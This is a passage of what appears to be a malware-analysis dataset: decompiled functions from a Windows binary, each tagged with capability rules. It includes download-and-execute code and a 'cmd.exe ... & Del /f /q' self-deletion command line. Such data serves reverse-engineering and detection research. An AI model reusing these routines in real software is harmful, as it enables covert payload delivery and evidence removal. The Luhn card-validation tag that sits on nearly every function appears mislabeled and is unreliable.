        "decompiled_code": "\nvoid __cdecl fcn.004021bd(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_ECX;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint var_ch;\n    uint var_8h;\n    \n    if (in_ECX[1] <= in_ECX[2]) {\n        piVar2 = (in_ECX[2] + 1U) * in_ECX[3];\n        piVar1 = fcn.00405f53();\n        if (piVar1 == NULL) {\n            piVar1 = NULL;\n        }\n        else {\n            *piVar1 = piVar2;\n            piVar1 = piVar1 + 1;\n            piVar4 = piVar2;\n            piVar3 = piVar1;\n            if (piVar2 != NULL) {\n                for (; piVar4 != NULL; piVar4 = piVar4 + -1) {\n                    *piVar3 = 0;\n                    piVar3 = piVar3 + 1;\n                }\n            }\n        }\n        piVar4 = NULL;\n        if (in_ECX[2] != NULL) {\n            do {\n                fcn.00403437(*in_ECX + piVar4);\n                piVar4 = piVar4 + 1;\n            } while (piVar4 < in_ECX[2]);\n        }\n        piVar4 = *in_ECX;\n        if (piVar4 != NULL) {\n            iVar5 = piVar4[-1];\n            piVar4 = piVar4 + iVar5;\n            for (; iVar5 != 0; iVar5 = iVar5 + -1) {\n                piVar4 = piVar4 + -1;\n                fcn.00405ea5();\n                *piVar4 = 0;\n            }\n        }\n        *in_ECX = piVar1;\n        in_ECX[1] = piVar2;\n    }\n    fcn.00403437(&arg_8h);\n    in_ECX[2] = in_ECX[2] + 1;\n    fcn.00405ea5();\n    return;\n}\n",
        "token_count": 486
    },
    "0040239e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040239e(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    \n    fcn.00405ca3();\n    fcn.00410af9(arg_ch * 0x30 + *in_ECX);\n    return arg_8h;\n}\n",
        "token_count": 72
    },
    "004027d3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "download URL",
            "receive data"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004027d3(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_10h;\n    uint var_ch;\n    uint lpFile;\n    \n    fcn.0040f76b();\n    uVar1 = fcn.004034a7();\n    fcn.0040346a(0x414684);\n    fcn.00403335(uVar1);\n    fcn.00405ea5();\n    iVar3 = arg_8h + 4;\n    fcn.0040362d(iVar3);\n    uVar1 = fcn.0040351d(&arg_8h);\n    fcn.00403335(uVar1);\n    fcn.00405ea5();\n    arg_8h = 0;\n    fcn.00405ea5();\n    uVar1 = lpFile;\n    fcn.0040362d(iVar3);\n    iVar3 = (*_sym.imp.urlmon.dll_URLDownloadToFileW)(0, arg_8h, uVar1, 0, 0);\n    fcn.00405ea5();\n    if (iVar3 == 0) {\n        uVar2 = (*_sym.imp.SHELL32.dll_ShellExecuteW)(0, 0x414688, lpFile, 0, 0, 5);\n        var_ch = 2;\n        if (0x20 < uVar2) {\n            var_ch = 0;\n        }\n    }\n    else {\n        var_ch = 1;\n    }\n    var_10h = 0x4147d8;\n    fcn.00404f2b(&var_10h);\n    fcn.00405ea5();\n    return;\n}\n",
        "token_count": 390
    },
    "00402961": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402961(uint param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    uint arg_10h;\n    int32_t iVar2;\n    uint lpCommandLine;\n    uint var_32dh;\n    uint lpFilename;\n    uint var_58h;\n    uint var_14h;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    fcn.00410f31();\n    if (*(param_2 + 0x68) != 0) {\n        (*_sym.imp.KERNEL32.dll_TerminateThread)(*0x54cbec, 0);\n    }\n    if (*(param_2 + 0x50) != 0) {\n        fcn.0041106c(*(param_2 + 8), param_2 + 0x14, 0x20006, 0);\n        fcn.0040362d(param_2 + 0x54);\n        fcn.00410f4c(&var_4h);\n        fcn.00405ea5();\n        fcn.00410fae();\n    }\n    fcn.00401052(&var_58h, 0, 0x44);\n    var_14h = 0;\n    var_10h = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, &lpFilename, 0x104);\n    fcn.0040102c(&lpCommandLine, \"cmd.exe /C ping 1.2.3.4 -n 2 -w 1000 > Nul & Del /f /q \", 0x37);\n    fcn.0040102c(&var_32dh, 0x417268, 1);\n    arg_10h = fcn.00401133(&lpFilename);\n    fcn.0040102c(&var_32dh + 1, &lpFilename, arg_10h);\n    iVar2 = fcn.00401133(&lpFilename);\n    fcn.0040102c(&var_32dh + iVar2 + 1, 0x417268, 2);\n    (*_sym.imp.KERNEL32.dll_CreateProcessA)(0, &lpCommandLine, 0, 0, 0, 0x8000000, 0, 0, &var_58h, &var_14h);\n    pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(var_10h);\n    (*pcVar1)(var_14h);\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 625
    },
    "00402af6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402af6(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint arg_8h;\n    uint *arg_8h_00;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    arg_8h = 0;\n    (*_sym.imp.KERNEL32.dll_SetLastError)(0);\n    param_2 = param_2 + 4;\n    iVar1 = param_2;\n    uVar2 = extraout_ECX;\n    fcn.0040362d(param_2);\n    iVar1 = fcn.0040ff0b(iVar1);\n    if (iVar1 == 0) {\n        arg_8h = (*_sym.imp.KERNEL32.dll_GetLastError)(uVar2);\n    }\n    else {\n        fcn.0040362d(param_2);\n        arg_8h_00 = &var_4h;\n        uVar2 = extraout_ECX_00;\n        fcn.0040362d(arg_8h_00);\n        fcn.004039b5(arg_8h_00);\n        fcn.00405ea5(arg_8h_00, uVar2);\n        fcn.0040399e();\n    }\n    fcn.0040362d(param_2);\n    uVar2 = fcn.00403fcb(arg_8h, param_2);\n    fcn.00404f2b(uVar2);\n    fcn.00403fb4();\n    return;\n}\n",
        "token_count": 364
    },
    "00402c8e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402c8e(void)\n\n{\n    uint arg_8h;\n    int32_t iVar1;\n    uint *arg_8h_00;\n    uint var_24h;\n    int32_t var_10h;\n    \n    fcn.00410d24();\n    arg_8h_00 = &var_10h;\n    fcn.0040131a(arg_8h_00);\n    arg_8h = fcn.00404660(arg_8h_00);\n    fcn.00404f2b(arg_8h);\n    fcn.00404624();\n    if (var_10h != 0) {\n        for (iVar1 = *(var_10h + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n            fcn.00401416();\n        }\n    }\n    return;\n}\n",
        "token_count": 192
    },
    "00402cec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "create directory",
            "get common file path"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402cec(uint param_1, int32_t param_2)\n\n{\n    uint arg_30h;\n    uint arg_1ch;\n    uint arg_18h;\n    uint arg_14h;\n    uint uVar1;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint noname_1;\n    uint arg_10h;\n    uint arg_20h;\n    uint arg_24h;\n    uint arg_28h;\n    uint arg_2ch;\n    uint lpPathName;\n    uint lpFilename;\n    uint var_48h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    fcn.0040f93f();\n    fcn.0040f80e();\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, &lpFilename, 0x104);\n    var_ch = 0;\n    fcn.00411e21();\n    var_8h = 0;\n    fcn.00411bf8(0x10ad, &var_8h);\n    fcn.004035e5(var_10h);\n    uVar1 = extraout_ECX;\n    fcn.004035e5(var_14h);\n    arg_30h = fcn.0040fa1f(var_14h, uVar1);\n    arg_24h = 0x414648;\n    arg_28h = extraout_ECX_00;\n    arg_2ch = var_8h;\n    fcn.004035e5(0x414648);\n    arg_20h = extraout_ECX_01;\n    fcn.0040fc7e();\n    arg_1ch = fcn.0040fc58();\n    arg_18h = fcn.0040fbfc();\n    arg_14h = fcn.0040fa42();\n    arg_10h = 0x10e;\n    uVar1 = extraout_ECX_02;\n    noname_1 = extraout_ECX_02;\n    fcn.0040fcb8();\n    uVar1 = fcn.00404241(uVar1, noname_1, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, arg_2ch, \n                         arg_30h, var_14h);\n    fcn.00404f2b(uVar1);\n    fcn.004041ff();\n    if (*(param_2 + 0x34) != 0) {\n        fcn.00401052(&lpPathName, 0, 0x208);\n        (*_sym.imp.SHELL32.dll_SHGetFolderPathW)(0, 0x1c, 0, 0, &lpPathName);\n        (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpPathName, L\"\\\\Microsoft Vision\\\\\");\n        (*_sym.imp.KERNEL32.dll_CreateDirectoryW)(&lpPathName, 0);\n        fcn.0040990a(param_1, 1);\n        var_8h = 0x417524;\n        fcn.00404f2b(&var_8h);\n    }\n    fcn.00405ea5();\n    fcn.00405ea5();\n    return;\n}\n",
        "token_count": 765
    },
    "00402e4c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00402e4c(uint *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00405eff();\n    fcn.00405f10(arg_10h);\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    fcn.00402f91(arg_8h_00, arg_10h);\n    fcn.00405eee();\n    return arg_8h;\n}\n",
        "token_count": 127
    },
    "00402e93": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402e93(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    if (*(arg_8h + 4) != 0) {\n        uVar1 = fcn.00405eff();\n        *in_ECX = uVar1;\n        fcn.00405f10(*(arg_8h + 4));\n        in_ECX[1] = *(arg_8h + 4);\n    }\n    return;\n}\n",
        "token_count": 132
    },
    "00402ecf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402ecf(uint arg_8h)\n\n{\n    int32_t lpString2;\n    int32_t in_ECX;\n    \n    lpString2 = fcn.00401085(*(in_ECX + 4) * 2 + 2);\n    fcn.00405f31(*(in_ECX + 4) + 2);\n    fcn.00405f10(*(in_ECX + 4));\n    fcn.004035e5(lpString2);\n    if (lpString2 != 0) {\n        fcn.00401099(lpString2);\n    }\n    return arg_8h;\n}\n",
        "token_count": 141
    },
    "00402f22": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402f22(uint arg_8h)\n\n{\n    int32_t lpString2;\n    int32_t in_ECX;\n    \n    lpString2 = fcn.00401085(*(in_ECX + 4) + 1);\n    fcn.00405f31(*(in_ECX + 4) + 1);\n    fcn.00405f10(*(in_ECX + 4));\n    fcn.004033bf(lpString2);\n    if (lpString2 != 0) {\n        fcn.00401099(lpString2);\n    }\n    return arg_8h;\n}\n",
        "token_count": 137
    },
    "00402f91": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402f91(uint arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    uVar1 = fcn.00405ec5();\n    *in_ECX = uVar1;\n    fcn.00405f10(arg_ch);\n    in_ECX[1] = in_ECX[1] + arg_ch;\n    return;\n}\n",
        "token_count": 94
    },
    "0040304c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040304c(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    uVar1 = fcn.00405eff();\n    *in_ECX = uVar1;\n    fcn.00405f10(*(arg_8h + 4));\n    in_ECX[1] = *(arg_8h + 4);\n    return;\n}\n",
        "token_count": 94
    },
    "0040309d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040309d(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_ECX;\n    uint var_4h;\n    \n    *arg_8h = 0;\n    iVar1 = fcn.0040308c();\n    if (0 < iVar1) {\n        iVar1 = fcn.0040308c(0, 0);\n        iVar1 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 2, *in_ECX, iVar1 + 2);\n        uVar2 = fcn.00405e22();\n        fcn.0040308c();\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0xfde9, 0, *in_ECX, 0xffffffff, uVar2, iVar1 * 2);\n        uVar2 = fcn.004035e5(uVar2);\n        fcn.00403437(uVar2);\n        fcn.00405ea5();\n        fcn.00405ea5();\n    }\n    return arg_8h;\n}\n",
        "token_count": 251
    },
    "0040318a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040318a(uint *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    fcn.0040308c();\n    fcn.0040308c();\n    uVar1 = fcn.00405e46();\n    *in_ECX = uVar1;\n    (*_sym.imp.KERNEL32.dll_lstrcatA)(uVar1, *arg_8h);\n    return;\n}\n",
        "token_count": 102
    },
    "004031d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "query environment variable"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004031d4(uint param_1, uint *param_2)\n\n{\n    uint lpDst;\n    \n    fcn.00401052(&lpDst, 0, 0x400);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(*param_2, &lpDst, 0x1ff);\n    fcn.004035e5(&lpDst);\n    return param_1;\n}\n",
        "token_count": 96
    },
    "00403272": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403272(uint arg_8h)\n\n{\n    uint ARG_0;\n    \n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, 0x4146a4, arg_8h);\n    fcn.004035e5(&ARG_0);\n    fcn.00403335(&arg_8h);\n    fcn.00405ea5();\n    return;\n}\n",
        "token_count": 93
    },
    "00403335": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403335(uint *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    fcn.00403261();\n    fcn.00403261();\n    uVar1 = fcn.00405e46();\n    *in_ECX = uVar1;\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(uVar1, *arg_8h);\n    return;\n}\n",
        "token_count": 99
    },
    "004034a7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.004034a7(uint *param_1, int32_t param_2)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    uint var_34h;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    *param_1 = 0;\n    var_8h = param_1;\n    var_4h = param_2;\n    arg_8h = fcn.00401085(param_2);\n    fcn.00401052(arg_8h, 0, param_2);\n    puVar2 = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJK...\";\n    puVar4 = &var_34h;\n    for (iVar1 = 10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar4 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = *puVar2;\n    uVar5 = 0;\n    uVar3 = var_4h - 1;\n    if (uVar3 != 0) {\n        do {\n            iVar1 = fcn.004010b7();\n            *(uVar5 + arg_8h) = *(&var_34h + iVar1 % 0x28);\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < uVar3);\n    }\n    *(arg_8h + uVar3) = 0;\n    fcn.004032bf(arg_8h);\n    fcn.00401099(arg_8h);\n    return var_8h;\n}\n",
        "token_count": 402
    },
    "004037d7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004037d7(uint *arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00411dc0(**arg_8h);\n    fcn.00403437(arg_8h_00);\n    fcn.00405ea5();\n    return;\n}\n",
        "token_count": 77
    },
    "00403813": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403813(uint *arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00411dc0(**arg_8h);\n    fcn.00403437(arg_8h_00);\n    fcn.00405ea5();\n    return;\n}\n",
        "token_count": 76
    },
    "0040387d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040387d(int32_t *arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t in_ECX;\n    \n    *(in_ECX + 4) = **arg_8h;\n    arg_8h_00 = fcn.00411dc0(*(*arg_8h + 4));\n    fcn.00403437(arg_8h_00);\n    fcn.00405ea5();\n    return;\n}\n",
        "token_count": 107
    },
    "00403922": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403922(uint *param_1)\n\n{\n    *param_1 = 0x414700;\n    if (param_1[3] != 0) {\n        fcn.00405eee();\n    }\n    param_1[3] = 0;\n    return;\n}\n",
        "token_count": 68
    },
    "00403962": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403962(uint *arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00411dc0(**arg_8h);\n    fcn.00403437(arg_8h_00);\n    fcn.00405ea5();\n    return;\n}\n",
        "token_count": 76
    },
    "00403c62": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403c62(uint *param_1)\n\n{\n    *param_1 = 0x414758;\n    if (param_1[3] != 0) {\n        fcn.00405eee();\n    }\n    param_1[3] = 0;\n    return;\n}\n",
        "token_count": 69
    },
    "00403c8f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403c8f(uint *arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_4h;\n    \n    fcn.00411dc0(**arg_8h);\n    arg_8h_00 = fcn.00403554(&var_4h);\n    fcn.00403125(arg_8h_00);\n    fcn.00405ea5();\n    fcn.00405ea5();\n    return;\n}\n",
        "token_count": 107
    },
    "00403d6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403d6c(int32_t *arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    int32_t in_ECX;\n    uint var_8h;\n    \n    *(in_ECX + 4) = **arg_8h;\n    arg_8h_00 = *(*arg_8h + 4);\n    uVar1 = fcn.00411dc0(arg_8h_00);\n    fcn.00403437(uVar1);\n    fcn.00405ea5();\n    *(in_ECX + 0x10) = *(arg_8h_00 + 8 + *arg_8h);\n    *(in_ECX + 0xc) = *(arg_8h_00 + 0xc + *arg_8h);\n    uVar1 = fcn.00402e4c(&var_8h, arg_8h_00 + 0x14, *(arg_8h_00 + 0x10 + *arg_8h));\n    fcn.00402e93(uVar1);\n    fcn.00403036();\n    return;\n}\n",
        "token_count": 259
    },
    "00403eed": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403eed(uint *param_1)\n\n{\n    *param_1 = 0x4147b0;\n    param_1[1] = 0x4147b8;\n    if (param_1[2] != 0) {\n        fcn.00405eee();\n    }\n    param_1[2] = 0;\n    return;\n}\n",
        "token_count": 86
    },
    "0040456a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040456a(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uchar auStack68 [36];\n    uint uStack32;\n    uint uStack28;\n    uchar auStack24 [16];\n    \n    uStack32 = 3;\n    arg_ch = 0;\n    uStack28 = 0;\n    auStack24 = ZEXT816(0);\n    if (*(in_ECX + 0xc) != 0) {\n        do {\n            puVar1 = fcn.00401735(auStack68, arg_ch);\n            fcn.00403740(*puVar1);\n            fcn.00401416();\n            iVar2 = fcn.00401735(auStack68, arg_ch);\n            fcn.00403761(iVar2 + 4);\n            fcn.00401416();\n            iVar2 = fcn.00401735(auStack68, arg_ch);\n            fcn.00403761(iVar2 + 8);\n            fcn.00401416();\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(in_ECX + 0xc));\n    }\n    fcn.00403679(arg_8h);\n    fcn.00403665();\n    return arg_8h;\n}\n",
        "token_count": 304
    },
    "00404624": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404624(uint *param_1)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = 0x414810;\n    if (param_1[1] != 0) {\n        for (iVar1 = *(param_1[1] + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n            fcn.00401416();\n        }\n    }\n    param_1[1] = 0;\n    param_1[3] = 0;\n    param_1[2] = 0;\n    return;\n}\n",
        "token_count": 133
    },
    "00404660": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404660(int32_t arg_8h)\n\n{\n    uint *in_ECX;\n    int32_t iVar1;\n    \n    *in_ECX = 0x414810;\n    fcn.0040131a(&arg_8h);\n    if (arg_8h != 0) {\n        for (iVar1 = *(arg_8h + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n            fcn.00401416();\n        }\n    }\n    return;\n}\n",
        "token_count": 119
    },
    "00404a2e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nuint __cdecl fcn.00404a2e(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint uVar2;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    uVar1 = *(in_ECX + 8);\n    arg_8h_00 = in_ECX + 4;\n    uVar2 = arg_8h;\n    fcn.00403761(arg_8h_00);\n    fcn.00403740(arg_8h_00);\n    fcn.00403679(arg_8h_00);\n    fcn.00403665(arg_8h_00, uVar1, uVar2, 0xf, 0, ZEXT816(0));\n    return arg_8h;\n}\n",
        "token_count": 243
    },
    "00405e46": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00405e46(int32_t param_1, uint32_t param_2)\n\n{\n    uint32_t arg_8h;\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = 0;\n    arg_8h = 0;\n    if (param_1 != 0) {\n        arg_8h = fcn.00405e02();\n    }\n    if (param_2 != 0) {\n        iVar1 = fcn.00405eb4();\n        if (param_1 == 0) {\n            return iVar1;\n        }\n        if ((iVar1 != 0) && (arg_8h != 0)) {\n            if (param_2 < arg_8h) {\n                arg_8h = param_2;\n            }\n            fcn.00405f10(arg_8h);\n        }\n    }\n    if (param_1 != 0) {\n        fcn.00405ea5();\n    }\n    return iVar1;\n}\n",
        "token_count": 226
    },
    "00406297": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using SHA1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00406297(uint32_t *param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint32_t uVar21;\n    uint32_t uVar22;\n    uint32_t uVar23;\n    uint32_t uVar24;\n    uint32_t uVar25;\n    uint32_t var_9ch;\n    uint32_t var_98h;\n    uint32_t var_94h;\n    uint32_t var_90h;\n    uint32_t var_8ch;\n    uint32_t var_88h;\n    uint32_t var_84h;\n    uint32_t var_80h;\n    uint32_t var_7ch;\n    uint32_t var_78h;\n    uint32_t var_74h;\n    uint32_t var_70h;\n    uint32_t var_6ch;\n    uint32_t var_68h;\n    uint32_t var_64h;\n    uint32_t var_60h;\n    uint32_t *var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_5ch = param_1;\n    fcn.0040102c(&var_9ch, param_2, 0x40);\n    uVar13 = *param_1;\n    uVar8 = param_1[1];\n    uVar7 = var_9ch >> 8 & 0xff00ff00 | var_9ch << 0x18 | (var_9ch & 0xff00) << 8 | var_9ch >> 0x18;\n    uVar3 = uVar8 >> 2 | uVar8 << 0x1e;\n    uVar8 = uVar7 + 0x5a827999 +\n            ((var_5ch[3] ^ var_5ch[2]) & uVar8 ^ var_5ch[3]) + (uVar13 << 5 | uVar13 >> 0x1b) + param_1[4];\n    uVar12 = var_98h >> 8 & 0xff00ff00 | var_98h << 0x18 | (var_98h & 0xff00) << 8 | var_98h >> 0x18;\n    uVar18 = uVar13 >> 2 | uVar13 << 0x1e;\n    uVar13 = var_5ch[3] + 0x5a827999 +\n             ((var_5ch[2] ^ uVar3) & uVar13 ^ var_5ch[2]) + (uVar8 * 0x20 | uVar8 >> 0x1b) + uVar12;\n    uVar1 = var_94h >> 8 & 0xff00ff00 | var_94h << 0x18 | (var_94h & 0xff00) << 8 | var_94h >> 0x18;\n    uVar19 = var_5ch[2] + 0x5a827999 + ((uVar3 ^ uVar18) & uVar8 ^ uVar3) + (uVar13 * 0x20 | uVar13 >> 0x1b) + uVar1;\n    uVar8 = uVar8 >> 2 | uVar8 * 0x40000000;\n    uVar2 = var_90h >> 8 & 0xff00ff00 | var_90h << 0x18 | (var_90h & 0xff00) << 8 | var_90h >> 0x18;\n    uVar14 = uVar13 >> 2 | uVar13 * 0x40000000;\n    uVar13 = uVar3 + 0x5a827999 + ((uVar8 ^ uVar18) & uVar13 ^ uVar18) + (uVar19 * 0x20 | uVar19 >> 0x1b) + uVar2;\n    uVar3 = var_8ch >> 8 & 0xff00ff00 | var_8ch << 0x18 | (var_8ch & 0xff00) << 8 | var_8ch >> 0x18;\n    uVar20 = uVar19 >> 2 | uVar19 * 0x40000000;\n    uVar19 = (uVar8 ^ (uVar8 ^ uVar14) & uVar19) + (uVar13 * 0x20 | uVar13 >> 